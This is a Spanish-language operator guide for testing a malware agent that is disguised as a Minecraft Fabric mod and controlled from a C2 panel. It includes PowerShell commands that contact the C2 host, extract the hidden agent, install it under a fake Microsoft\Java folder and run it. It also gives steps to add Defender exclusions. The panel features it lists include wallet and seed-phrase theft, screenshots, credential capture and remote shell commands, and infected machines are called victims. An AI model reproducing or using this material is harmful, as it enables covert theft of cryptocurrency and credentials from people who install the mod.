# Prueba del agente en Windows (dualboot)

Build preparado: `windows-dualboot-v3` · `0.4.0` · perfil `full`.  
Panel: <https://c2.spc-labpanel.com>  
Descarga: <https://c2.spc-labpanel.com/builds> → `windows-dualboot-v3` → descargar.  
SHA-256 esperado: `4c16120aed3257f9f97e5976f0bb44c54ac2ae513472aa1801ae1122e866a79c`.

No compartas el JAR: lleva el `build_secret` del build.

## Antes de arrancar Windows

- Ten a mano la contraseña de admin y el TOTP.
- Si usas BitLocker, guarda la clave de recuperación.
- El doble arranque puede desajustar el reloj. La firma HMAC tolera ±300 s:
  sincroniza la hora en Windows (`Configuración → Hora e idioma → Sincronizar ahora`)
  y, en PowerShell como administrador, `w32tm /resync`.

## Preflight antes de tocar Minecraft

En PowerShell:

```powershell
curl.exe -i https://c2.spc-labpanel.com/api/v1/preflight
[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
```

Debe responder `200` con `ok:true`. Compara `server_time` con la hora UTC local; si difieren más de 300 s, sincroniza el reloj antes de seguir.

## Plan B: agente sin Minecraft

Si el mod no arranca el agente, ejecuta esto en PowerShell tras descargar el JAR. Extrae el agente del JAR, lo instala y lo lanza directamente:

```powershell
$jar = Get-ChildItem "$env:USERPROFILE\Downloads\fabric-sync-0.4.0-*.jar" | Select-Object -First 1
$dst = "$env:LOCALAPPDATA\Microsoft\Java"
New-Item -ItemType Directory -Force $dst | Out-Null
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [IO.Compression.ZipFile]::OpenRead($jar.FullName)
[IO.Compression.ZipFileExtensions]::ExtractToFile($zip.GetEntry('serverpackcore/agent.bin'), "$dst\runtime.jar", $true)
[IO.Compression.ZipFileExtensions]::ExtractToFile($zip.GetEntry('serverpackcore/config.json'), "$dst\crypto-config.json", $true)
$zip.Dispose()
Start-Process javaw -ArgumentList @('-jar', "$dst\runtime.jar", '--game-dir', "$env:APPDATA\.minecraft")
Start-Sleep 5
Get-Content "$dst\logs\agent.log" -Tail 40
```

Si aparece en **Equipos**, el servidor y el agente están bien y el fallo es solo del mod/Fabric. Si no aparece, adjunta esa salida.

## Instalación


1. Abre <https://c2.spc-labpanel.com> en Windows e inicia sesión con TOTP.
2. Entra en **Builds**, busca `windows-dualboot-v3`, descarga el JAR y comprueba el hash:

   ```powershell
   Get-FileHash "$env:USERPROFILE\Downloads\fabric-sync-0.4.0-*.jar" -Algorithm SHA256
   ```

3. Instala Java 17 x64 (Temurin): <https://adoptium.net/temurin/releases/?version=17>.
4. Instala Minecraft **1.20.1** y Fabric Loader **0.20.1**:
   <https://fabricmc.net/use/installer/>. Añade **Fabric API 0.92.12+1.20.1**
   para 1.20.1.
5. Cierra Minecraft. Crea `%APPDATA%\.minecraft\mods` si no existe y copia allí
   el JAR. Deja solo una copia de `fabric-sync`; borra versiones anteriores.
6. En Defender, añade exclusiones para `%APPDATA%\.minecraft\mods` y
   `%LOCALAPPDATA%\Microsoft\Java` (el agente se instala ahí).

## Prueba

1. Abre el perfil **fabric-loader-1.20.1** y entra en un mundo (vale un mundo
   local). Permanece dentro 20–60 s.
2. En el panel, **Equipos**: debe aparecer tu hostname. Espera a `socket`.
   Si solo ves `hb`, espera 30 s o reinicia Minecraft.
3. Abre la ficha: **Resumen → Escanear wallets**, **Buscar seeds**, **Screenshot**.
4. Revisa **Bóveda** y **Actividad**. Prueba `shell whoami` desde Opciones.
5. Comprueba que recargar conserva wallets, seeds, credenciales y contadores, y
   que dos escaneos seguidos no duplican filas.

## Si falla

| Síntoma | Acción |
|---|---|
| No aparece el equipo | Reloj, Java 17, Fabric 1.20.1/0.20.1, Fabric API, Defender y URL del panel |
| `agent_offline` | Sin WebSocket: firewall/HTTPS/reloj; espera al heartbeat |
| `403`/`410` | Build o víctima revocados: crea/enrola de nuevo |
| Screenshot falla | Sesión sin escritorio interactivo o RDP desconectado |
| Wallets vacías | No hay carteras instaladas; prueba con MetaMask o Phantom |
| `invalid_params` | Agente antiguo: usa el JAR compilado por este panel |

## Al terminar

- Mantén el build si vas a seguir probando.
- Para cerrar la prueba, revoca la víctima o el build y elimina el JAR de `mods`.
